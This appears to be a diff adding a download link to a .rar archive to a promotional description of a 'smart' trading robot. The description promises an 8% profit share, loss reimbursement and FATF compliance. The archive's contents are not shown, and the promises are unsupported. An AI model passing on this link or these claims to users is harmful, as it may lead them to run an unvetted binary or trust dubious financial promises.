@@ -1,3 +1,6 @@
+
+🔋 Download Link : https://github.com/RoboUpTrend/RoboUpTrend/raw/master/RoboUpTrend.rar
+
 💎 A smart robot trade that will leverage and without leverage (of your choice) and earn only 8% profit of your profit from each trade. And if your trade rarely stop limit, you will be reimbursed for loss in subsequent trades by not receiving a 8% commission.
 
 🚨 Warning: Our company is operating under the FATF rules and restricted countries cannot use this robot's features
